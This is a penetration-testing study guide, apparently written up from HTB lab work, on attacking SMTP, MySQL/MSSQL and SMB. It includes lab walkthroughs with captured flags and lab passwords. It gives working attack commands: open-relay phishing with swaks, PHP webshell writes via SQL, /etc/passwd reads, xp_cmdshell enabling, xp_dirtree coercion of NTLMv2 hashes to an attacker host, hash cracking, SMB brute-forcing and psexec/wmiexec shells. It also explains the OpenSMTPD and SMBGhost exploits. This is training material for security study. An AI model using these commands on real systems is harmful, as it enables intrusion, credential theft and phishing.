nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

**Output:**

```
PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

**Step 2 — Send a phishing email through the open relay using SWAKS:**

```bash
swaks --from notifications@inlanefreight.com \
      --to employees@inlanefreight.com \
      --header 'Subject: Company Notification' \
      --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' \
      --server 10.10.11.213
```

---

## Latest Email Service Vulnerabilities — CVE-2020-7247 (OpenSMTPD RCE)

One of the most critical recently disclosed SMTP vulnerabilities was discovered in **OpenSMTPD up to version 6.6.2**, assigned **CVE-2020-7247**, which allows an unauthenticated remote attacker to execute arbitrary OS commands on the server simply by sending a crafted email message. The vulnerability requires **no authentication whatsoever**. The vulnerability lies in the function that processes the sender's email address in the `MAIL FROM` SMTP command — by injecting a semicolon (`;`) followed by arbitrary shell commands within the sender address field, an attacker can cause the OpenSMTPD process to execute those commands.

**Initiation Phase — Concept of Attacks Table:**

| Step | Remote Code Execution Action | Category |
|------|------------------------------|----------|
| 1 | The attacker manually or automatically inputs the crafted SMTP session with the malicious MAIL FROM field as the source | Source |
| 2 | OpenSMTPD takes the email with all required fields (MAIL FROM, RCPT TO) and processes it as a standard incoming message | Process |
| 3 | Port 25 is a privileged port requiring root to bind — OpenSMTPD therefore runs with root/elevated privileges throughout | Privileges |
| 4 | The crafted email data is forwarded to another internal OpenSMTPD process responsible for local mail delivery | Destination |

**RCE Trigger Phase — Concept of Attacks Table:**

| Step | Remote Code Execution Action | Category |
|------|------------------------------|----------|
| 5 | The malicious sender field content — the entire MAIL FROM string including the semicolon and injected command — serves as the source for the RCE trigger | Source |
| 6 | The delivery handler reads the sender field, the semicolon interrupts address parsing per the vulnerable source code logic, and the remainder is passed to the shell for execution | Process |
| 7 | OpenSMTPD delivery processes inherit root privileges from the parent daemon — the injected command executes with full root-level system access | Privileges |
| 8 | A reverse shell is established over the network from the target back to the attacker's host, providing interactive root access to the compromised system | Destination |

---

# Attacking SQL Databases

SQL databases like MySQL and Microsoft SQL Server (MSSQL) are among the highest-value targets in penetration testing engagements. They store extremely sensitive information including user credentials, PII, payment data, and business-critical records. Both MySQL and MSSQL use Structured Query Language (SQL) for querying data, though their syntax and features differ in important ways.

---

## Default Ports and Enumeration

- **MSSQL** runs on TCP/1433 and UDP/1434 by default; hidden mode uses TCP/2433
- **MySQL** runs on TCP/3306 by default

**Command:**

```bash
nmap -Pn -sV -sC -p1433 10.10.10.125
```

Flags:
- `-Pn` — skip host discovery, treat host as up
- `-sV` — detect service versions
- `-sC` — run default Nmap scripts (includes `ms-sql-info`, `ms-sql-ntlm-info`)
- `-p1433` — scan only port 1433

Example output reveals SQL Server version, hostname, domain name, NetBIOS name, and SSL certificate details.

---

## Authentication Mechanisms

### MSSQL Authentication Modes

| Mode | Description |
|------|-------------|
| Windows Authentication | Default mode; uses Windows/AD accounts; already-authenticated Windows users need no additional credentials |
| Mixed Mode | Supports both Windows/AD accounts AND SQL Server local accounts with username/password pairs |

### CVE-2012-2122 (MySQL Authentication Bypass)

A historical vulnerability in MySQL 5.6.x where repeated login attempts with the same wrong password could succeed due to a comparison bug. Simply retrying the same wrong password repeatedly in a loop was enough to eventually bypass authentication on affected versions.

---

## Common Misconfigurations

- Anonymous access enabled — no credentials required to connect
- User accounts with blank passwords — accounts exist but have no password set
- Overly permissive group access — any user, group, or machine account can authenticate
- Default credentials left unchanged — `sa` with blank password, or vendor defaults

---

## Privileges and What You Can Do

With sufficient privileges you can:

- Read or modify database contents
- Read or change server configuration
- Execute OS commands (MSSQL via `xp_cmdshell`)
- Read local files from the filesystem
- Communicate with other linked databases
- Capture NTLM hashes of the service account
- Impersonate other SQL users/logins
- Pivot to other network segments

---

## Connecting to SQL Databases

### Connecting to MySQL

```bash
mysql -u julio -pPassword123 -h 10.129.20.13
```

- `-u` — username
- `-p` — password (no space between `-p` and the password)
- `-h` — target host

### Connecting to MSSQL with sqlcmd (Windows)

```cmd
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

> In sqlcmd, queries are executed by typing `GO` on a new line — never use `;` before `GO`

### Connecting to MSSQL with sqsh (Linux)

```bash
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

For local Windows accounts use: `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`

### Connecting to MSSQL with mssqlclient.py (Impacket)

```bash
# SQL Authentication
mssqlclient.py -p 1433 julio@10.129.203.7

# Windows Authentication
mssqlclient.py -p 1433 mssqlsvc@10.129.203.12 -windows-auth
```

> `mssqlclient.py` provides extra helper commands: `enum_db`, `enum_users`, `enum_logins`, `enum_owner`

---

## SQL Default Databases

### MySQL Default Databases

| Database | Purpose |
|----------|---------|
| mysql | System database storing MySQL server configuration |
| information_schema | Metadata about all databases, tables, columns |
| performance_schema | Low-level MySQL execution monitoring |
| sys | Helps DBAs interpret Performance Schema data |

### MSSQL Default Databases

| Database | Purpose |
|----------|---------|
| master | Core instance information |
| msdb | Used by SQL Server Agent for jobs |
| model | Template copied when creating new databases |
| resource | Read-only; system objects visible in sys schema |
| tempdb | Temporary objects for SQL queries |

---

## Essential SQL Syntax

### Show All Databases

MySQL:
```sql
SHOW DATABASES;
```

MSSQL:
```sql
SELECT name FROM master.dbo.sysdatabases
GO
```

### Switch Database

MySQL:
```sql
USE htbusers;
```

MSSQL:
```sql
USE htbusers
GO
```

### Show Tables

MySQL:
```sql
SHOW TABLES;
```

MSSQL:
```sql
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
GO
```

### Dump Table Contents

MySQL:
```sql
SELECT * FROM users;
```

MSSQL:
```sql
SELECT * FROM users
GO
```

---

## Command Execution via xp_cmdshell (MSSQL)

`xp_cmdshell` is a powerful extended stored procedure in MSSQL that lets you run operating system commands directly from SQL queries. It spawns a Windows process with the same security rights as the SQL Server service account. It is **disabled by default** and must be enabled by an administrator.

### Execute a Command

```sql
xp_cmdshell 'whoami'
GO
```

### Enable xp_cmdshell (requires sysadmin)

```sql
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
```

---

## Writing Files to the Filesystem

### MySQL — Write a Webshell

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

Then browse to `http://target/webshell.php?c=whoami` to execute commands.

### Check secure_file_priv (MySQL)

```sql
show variables like "secure_file_priv";
```

- Empty value = no restriction, file write is possible
- Directory path = only that directory is allowed
- NULL = file operations completely disabled

### MSSQL — Write a File via Ole Automation

First enable Ole Automation Procedures:

```sql
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO
```

Then create the file:

```sql
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```

---

## Reading Local Files

### MSSQL — Read Any File

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```

### MySQL — Read Local Files

```sql
SELECT LOAD_FILE("/etc/passwd");
```

Requires `FILE` privilege and `secure_file_priv` to be empty.

---

## Capturing MSSQL Service Hash

MSSQL's `xp_dirtree` and `xp_subdirs` stored procedures can force the SQL Server to authenticate to an attacker-controlled SMB server, sending the **NTLMv2 hash** of the Windows service account running SQL Server.

**Step 1 — Start Responder or impacket-smbserver:**

```bash
# Option A — Responder
sudo responder -I tun0

# Option B — impacket-smbserver
sudo impacket-smbserver share ./ -smb2support
```

**Step 2 — Trigger Hash Capture from MSSQL:**

```sql
EXEC master..xp_dirtree '\\10.10.14.127\share\'
GO
```

**Step 3 — Crack the Hash:**

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
john --wordlist=/usr/share/wordlists/rockyou.txt hash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

---

## Impersonating Users in MSSQL

### Find Users You Can Impersonate

```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
GO
```

### Check Current User and Role

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

- Returns `1` = you are sysadmin
- Returns `0` = you are not sysadmin

### Impersonate a User

```sql
EXECUTE AS LOGIN = 'sa'
GO
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

### Revert Back to Original User

```sql
REVERT
GO
```

> **Important:** Run `EXECUTE AS LOGIN` from the `master` database since all users have access to it by default.

---

## Linked Servers in MSSQL

### Identify Linked Servers

```sql
SELECT srvname, isremote FROM sysservers
GO
```

- `isremote = 1` means remote server
- `isremote = 0` means linked server

### Execute Queries on a Linked Server

```sql
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO
```

---

## Lab Assessment — Complete Walkthrough

### Task 1 — Find the mssqlsvc Password

**Step 1 — Connect to MSSQL as htbdbuser:**

```bash
mssqlclient.py -p 1433 htbdbuser@10.129.203.12
# Password: MSSQLAccess01!
```

**Step 2 — Start impacket-smbserver in a second terminal:**

```bash
sudo impacket-smbserver share ./ -smb2support
```

**Step 3 — Trigger hash capture from inside MSSQL:**

```sql
EXEC master..xp_dirtree '\\10.10.14.127\share\'
GO
```

**Step 4 — Save the captured hash:**

```bash
nano hash
# paste the full NTLMv2 hash string
```

**Step 5 — Decompress rockyou and crack:**

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

**Result:** `mssqlsvc : princess1`

### Task 2 — Read the Flag from flagDB

**Step 1 — Connect as mssqlsvc using Windows auth:**

```bash
mssqlclient.py -p 1433 mssqlsvc@10.129.131.234 -windows-auth
# Password: princess1
```

**Step 2 — List databases:**

```sql
enum_db
```

**Step 3 — Switch to flagDB:**

```sql
use flagDB
```

**Step 4 — List tables:**

```sql
SELECT table_name FROM INFORMATION_SCHEMA.TABLES
```

Found: `tb_flag`

**Step 5 — Read the flag:**

```sql
SELECT * FROM tb_flag
```

**Flag:** `HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}`

### Key Lessons Learned

- `SHOW DATABASES` is MySQL syntax — in MSSQL always use `SELECT name FROM master.dbo.sysdatabases`
- Never add `;` before `GO` in sqlcmd — type `GO` alone on its own new line
- Passwords with `!` must be wrapped in single quotes in bash to prevent history expansion
- `mssqlsvc` is a Windows account — always use `-windows-auth` flag with impacket tools
- The `@` symbol in passwords confuses crackmapexec into treating the suffix as a domain — fix with `-d .`
- `mssqlclient.py` built-in helpers `enum_db`, `enum_users`, `enum_logins`, `enum_owner` are faster than raw SQL for enumeration
- `db_datareader` role is enough to `SELECT` data — you do not need sysadmin just to read tables

---

## Latest SQL Vulnerabilities — xp_dirtree NTLMv2 Hash Theft

This attack abuses the legitimate authentication mechanism built into the Windows SMB protocol rather than a bug in MSSQL itself. What makes this particularly dangerous is that it works against **fully patched and up-to-date MSSQL installations** because the behavior being abused is intentional by design — it is a feature, not a bug.

**Attack Phase 1 — Initiation:**

| Step | XP_DIRTREE Action | Attack Category |
|------|-------------------|----------------|
| 1 | Attacker provides xp_dirtree with a UNC path pointing to their controlled SMB server | Source |
| 2 | MSSQL processes the function and attempts to list the remote network folder contents | Process |
| 3 | Execution runs under the MSSQL service account's elevated privileges | Privileges |
| 4 | The attacker's SMB listener is the destination receiving the authentication attempt | Destination |

**Attack Phase 2 — Stealing the Hash:**

| Step | Stealing the Hash Action | Attack Category |
|------|--------------------------|----------------|
| 5 | Attacker's SMB service receives the authentication attempt from the MSSQL service | Source |
| 6 | SMB service processes the incoming connection and queries the specified folder | Process |
| 7 | NTLMv2 hash of the MSSQL service account is automatically included in the Windows SMB handshake | Privileges |
| 8 | Attacker's controlled host captures the hash via Responder or impacket-smbserver | Destination |

**Cracking the Captured Hash:**

```bash
# Save hash to file
nano hash

# Decompress rockyou
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt hash
john --show --format=netntlmv2 hash

# Crack with Hashcat (faster with GPU)
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

Lab result: `mssqlsvc : princess1`

**Using the Cracked Credentials:**

```bash
# Connect as sysadmin service account
mssqlclient.py -p 1433 mssqlsvc@10.129.131.234 -windows-auth
# Password: princess1

# Verify sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

# Enable xp_cmdshell for OS command execution
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
xp_cmdshell 'whoami'
GO
```

---

# Attacking SMB Services

Server Message Block (SMB) is a network file sharing protocol used primarily in Windows environments for sharing files, printers, and other resources across a network. It operates on **TCP port 445** and older versions also used TCP/139 with NetBIOS. SMB is one of the most commonly attacked services in penetration testing because it is almost always present in Windows environments and has historically had numerous critical vulnerabilities.

---

## SMB Protocol Versions

| Version | Notes |
|---------|-------|
| SMBv1 | Legacy, dangerous, exploited by EternalBlue, often disabled on modern systems |
| SMBv2 | Introduced in Windows Vista, more secure, default on modern Windows |
| SMBv3 | Introduced in Windows 8/Server 2012, adds encryption support |

---

## Enumeration of SMB Services

### Nmap SMB Enumeration

```bash
nmap -p 445 -sV --script smb-security-mode,smb2-security-mode,smb-os-discovery 10.129.203.6
```

Full vulnerability script scan:

```bash
nmap -p 139,445 --script=smb-vuln* 10.129.203.6
```

What to look for:
- SMB signing enabled or disabled
- SMBv1 support status
- OS version and hostname
- Null session support
- Known vulnerabilities (MS17-010, MS08-067, CVE-2020-0796)

### Enumerate Shares with smbclient

```bash
# Null session — no credentials
smbclient -L //10.129.203.6 -N

# With credentials
smbclient -L //10.129.203.6 -U jason%'34c8zuNBo91!@28Bszh'
```

- `-L` — list all available shares on the target
- `-N` — no password (null session attempt)
- `-U user%pass` — provide credentials in `user%password` format

### Enumerate with CrackMapExec

```bash
crackmapexec smb 10.129.203.6 --shares -u jason -p '34c8zuNBo91!@28Bszh' -d .
```

---

## SMB Null Sessions

A null session is an unauthenticated connection to an SMB service — connecting without providing any username or password at all.

```bash
# Test null session with smbclient
smbclient //10.129.203.6/share -N

# Test with crackmapexec
crackmapexec smb 10.129.203.6 -u '' -p ''
```

---

## Brute-Forcing SMB Credentials

### Brute-Forcing with Hydra

> Hydra's SMB module only supports SMBv1. If the target has disabled SMBv1 you will receive a clear error message and must switch to a different tool.

```bash
# Single username, password list
hydra -l jason -P password.list 10.129.203.6 smb

# Multiple usernames, password list
hydra -L users.list -P passwords.list 10.129.203.6 smb
```

Common error:

```
[ERROR] target smb://10.129.203.6:445/ does not support SMBv1
```

This means the target runs SMBv2/v3 only — switch to CrackMapExec immediately.

### Brute-Forcing with CrackMapExec

```bash
# Single user, password list
crackmapexec smb 10.129.203.6 -u jason -p password.list --continue-on-success

# Multiple users and passwords
crackmapexec smb 10.129.203.6 -u users.list -p passwords.list --continue-on-success

# Passwords containing @ require -d . to prevent domain parsing confusion
crackmapexec smb 10.129.203.6 -u jason -p '34c8zuNBo91!@28Bszh' -d .
```

Output meanings:
- `[+]` — valid credentials confirmed
- `[-]` — invalid credentials
- `(Pwn3d!)` — account has administrator rights on the target

### Brute-Forcing with Medusa

```bash
medusa -u jason -P password.list -h 10.129.203.6 -M smb
```

Common error:

```
Couldn't load "smb" [/usr/lib/x86_64-linux-gnu/medusa/modules/smb.mod: cannot open shared object file]
```

Fix: switch to CrackMapExec which has SMB support built in without separate modules.

---

## Connecting to SMB Shares

### Connect with smbclient

```bash
# Correct syntax — use forward slashes
smbclient //10.129.203.6/GGJ -U jason%'34c8zuNBo91!@28Bszh'

# Prompt for password separately
smbclient //10.129.203.6/GGJ -U jason
```

Common smbclient error:

```
\10.129.203.6GGJ: Not enough '\' characters in service
```

Fix: use `//10.129.203.6/GGJ` with forward slashes, not backslashes.

### smbclient Commands Inside the Shell

```bash
ls              # list files and directories in current location
get filename    # download a specific file to your local machine
put filename    # upload a local file to the remote share
cd directory    # change into a subdirectory
pwd             # display the current remote directory path
mkdir dirname   # create a new directory on the remote share
del filename    # delete a file from the remote share
exit            # disconnect from the SMB share
```

### Mount SMB Share (Linux)

```bash
sudo mount -t cifs //10.129.203.6/GGJ /mnt/smb -o username=jason,password='34c8zuNBo91!@28Bszh'
```

---

## Capturing SMB Hashes with Responder

Responder is a powerful tool that listens on the network for LLMNR, NBT-NS, and MDNS broadcast queries. When a Windows machine fails to resolve a hostname via DNS, it falls back to broadcasting these queries. Responder answers these broadcasts pretending to be the requested host, causing the victim machine to attempt SMB authentication against Responder and sending its NTLMv2 hash in the process.

```bash
sudo responder -I tun0
```

**Captured Hash Format:**

```
[SMB] NTLMv2-SSP Username : WINSRV02\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:aaaaaaaaaaaaaaaa:66a7cb0df59339f0...
```

### Force Hash Capture via MSSQL xp_dirtree

**Step 1 — Start listener:**

```bash
sudo responder -I tun0
# OR
sudo impacket-smbserver share ./ -smb2support
```

**Step 2 — Trigger from MSSQL:**

```sql
EXEC master..xp_dirtree '\\10.10.14.127\share\'
GO
```

---

## Cracking Captured NTLMv2 Hashes

### Crack with John the Ripper

```bash
# Decompress rockyou if needed
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Crack the NTLMv2 hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash

# Display all cracked passwords reliably
john --show --format=netntlmv2 hash
```

### Crack with Hashcat

```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

- `-m 5600` — specifies the NTLMv2 hash type for Hashcat

---

## SMB Relay Attacks

Instead of cracking a captured NTLMv2 hash, you can relay it directly to another machine on the network to authenticate as that user without ever knowing the plaintext password. This works when **SMB signing is disabled** on the target.

**Requirements for relay attack:**
- SMB signing must be disabled on the relay target
- The relayed user account must have local admin rights on the relay target

**Check if SMB Signing is Disabled:**

```bash
nmap -p 445 --script smb2-security-mode 10.129.203.6
crackmapexec smb 10.129.203.6 --gen-relay-list targets.txt
```

---

## Getting a Shell After SMB Compromise

### Using impacket-psexec

```bash
impacket-psexec jason:'34c8zuNBo91!@28Bszh'@10.129.203.6
```

### Using impacket-smbexec

```bash
impacket-smbexec jason:'34c8zuNBo91!@28Bszh'@10.129.203.6
```

`smbexec` is stealthier than `psexec` because it does not upload a binary to disk.

### Using impacket-wmiexec

```bash
impacket-wmiexec jason:'34c8zuNBo91!@28Bszh'@10.129.203.6
```

`wmiexec` uses Windows Management Instrumentation instead of SMB for command execution.

### CrackMapExec Command Execution

```bash
crackmapexec smb 10.129.203.6 -u jason -p '34c8zuNBo91!@28Bszh' -d . -x 'whoami'
```

- `-x` — execute a single OS command on the target and return the output

---

## Special Characters in Passwords — Bash Gotchas

Special characters in passwords cause serious failures when passed on the Linux command line:
- `!` triggers bash history expansion
- `@` is interpreted by CrackMapExec as a domain separator
- `$` gets silently expanded as a shell variable name

**Solutions:**

```bash
# Single quotes prevent all bash interpretation
crackmapexec smb 10.129.203.6 -u jason -p '34c8zuNBo91!@28Bszh' -d .

# $'' syntax for complex escaping scenarios
crackmapexec smb 10.129.203.6 -u jason -p $'34c8zuNBo91!@28Bszh' -d .

# The -d . flag prevents @ being parsed as a domain separator
# Always use -d . when the password contains the @ symbol
crackmapexec smb 10.129.203.6 -u jason -p 'password@something' -d .
```

---

## Finding SSH Keys via SMB

System administrators frequently store SSH private keys, configuration files, scripts, and credentials on shared network drives for backup purposes or administrative convenience.

### Download and Use an SSH Key

```bash
# Inside smbclient — list and download the key
smb: \> ls
smb: \> get id_rsa

# Set correct permissions (SSH requires this)
chmod 600 id_rsa

# SSH using the private key
ssh -i id_rsa jason@10.129.203.6
```

> **Why chmod 600 is required:** SSH refuses to use a private key that is readable by other users and throws a "Permissions too open" or "UNPROTECTED PRIVATE KEY FILE" error — `chmod 600` restricts it to owner-read-write only.

### Crack a Password-Protected SSH Key

```bash
# Convert key to John-crackable format
ssh2john id_rsa > hash.txt

# Crack with John
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Lab Assessment — Complete Walkthrough

### Task 1 — Brute-Force FTP on Port 2121 (robin)

```bash
hydra -L users.list -P passwords.list -s 2121 10.129.203.6 ftp
```

**Result:**

```
[2121][ftp] host: 10.129.203.6   login: robin   password: 7iz4rnckjsduza7
```

**Connect to FTP:**

```bash
ftp 10.129.203.6 2121
# Username: robin
# Password: 7iz4rnckjsduza7
```

### Task 2 — Brute-Force SMB (jason) and Find SSH Key

**Step 1 — Hydra fails:**

```bash
hydra -l jason -P password.list 10.129.203.6 smb
# ERROR: target does not support SMBv1
```

**Step 2 — Medusa fails:**

```bash
medusa -u jason -P password.list -h 10.129.203.6 -M smb
# ERROR: Couldn't load "smb" module
```

**Step 3 — CrackMapExec with -d . flag:**

```bash
crackmapexec smb 10.129.203.6 -u jason -p password.list -d . --continue-on-success
# [+] .\jason:34c8zuNBo91!@28Bszh
```

**Step 4 — Connect to SMB and download id_rsa:**

```bash
smbclient //10.129.203.6/GGJ -U jason%'34c8zuNBo91!@28Bszh'
smb: \> ls
smb: \> get id_rsa
```

**Step 5 — SSH with the private key:**

```bash
chmod 600 id_rsa
ssh -i id_rsa jason@10.129.203.6
```

**Step 6 — Read the flag:**

```bash
ls
cat flag.txt
# HTB{SMB_4TT4CKS_2349872359}
```

### Key Lessons Learned

- Always use `-s` in Hydra to target non-standard ports like FTP on 2121
- Use `-L` not `-U` in Hydra for plain text username lists
- Hydra SMB only works on SMBv1 — if target uses SMBv2/v3 switch to CrackMapExec immediately
- Passwords with `@` need `-d .` in CrackMapExec to prevent domain separator confusion
- Single quotes in bash prevent special characters like `!` from being interpreted by the shell
- Always `chmod 600 id_rsa` before using any SSH private key
- Check every file in every accessible SMB share — SSH keys and credentials are commonly stored there
- `--continue-on-success` prevents CrackMapExec from stopping after the first valid credential found
- `(Pwn3d!)` in CrackMapExec output means admin rights — immediately try psexec or wmiexec

---

## Latest SMB Vulnerabilities — SMBGhost (CVE-2020-0796)

**SMBGhost** is one of the most significant SMB vulnerabilities in recent years, assigned **CVE-2020-0796**, affecting SMB v3.1.1 in Windows 10 versions 1903 and 1909 as well as their Server equivalents. The vulnerability allowed an unauthenticated attacker to achieve Remote Code Execution with SYSTEM-level privileges. The flaw existed in the **compression mechanism** of SMBv3.1.1 and specifically in how the driver handled compressed data packets during SMB session negotiation before authentication takes place.

### The Concept — Integer Overflow

At its core SMBGhost is an **integer overflow** in the SMB kernel driver function that processes compressed network packets. An integer overflow occurs when an arithmetic operation produces a result that exceeds the maximum value the allocated memory variable can hold. A crafted size value causes the overflow, which in turn controls how much data is copied into a fixed-size buffer — writing beyond the buffer into adjacent memory that contains CPU instructions. By carefully constructing the overflow payload, an attacker replaces those CPU instructions with their own shellcode.

### Attack Phase 1 — Initiation

| Step | SMBGhost Action | Attack Category |
|------|----------------|----------------|
| 1 | Attacker sends a manipulated malformed compressed packet to the target SMB server on TCP/445 | Source |
| 2 | The compressed packet is processed according to the previously negotiated protocol responses | Process |
| 3 | Processing runs with full SYSTEM privileges inside the SMB kernel driver | Privileges |
| 4 | The local SMB kernel driver process is the destination responsible for processing the packet | Destination |

### Attack Phase 2 — Remote Code Execution

| Step | RCE Trigger Action | Attack Category |
|------|-------------------|----------------|
| 5 | The overflowed buffer state from phase one serves as the source for the second attack cycle | Source |
| 6 | The integer overflow is exploited by replacing overwritten buffer with attacker shellcode, forcing CPU execution | Process |
| 7 | The same SYSTEM-level kernel driver privileges are used to execute the injected shellcode | Privileges |
| 8 | The attacker's remote system is the destination — the shellcode establishes reverse access to the local target | Destination |

### Mitigation and Detection

**Check for vulnerability with Nmap:**

```bash
nmap -p 445 --script smb-vuln-cve-2020-0796 10.129.203.6
```

**Vulnerable system indicators:**
- Windows 10 version 1903 or 1909
- Windows Server version 1903 or 1909
- SMBv3.1.1 enabled
- Missing March 2020 security updates (KB4551762)

**Defensive mitigations:**

```powershell
# Disable SMBv3 compression as temporary workaround (no reboot needed)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" DisableCompression -Type DWORD -Value 1

# Apply the official patch
# Install KB4551762 for Windows 10 1903/1909
```

- Block TCP port 445 at the network perimeter to prevent external exploitation
- Use network segmentation to limit which hosts can reach internal SMB services
- Deploy endpoint detection tools that monitor for SMBGhost exploitation patterns

---

*Notes cover: FTP, RDP, DNS, Email Services, SQL Databases (MySQL & MSSQL), and SMB — compiled for HTB/CRTA study and penetration testing reference.*
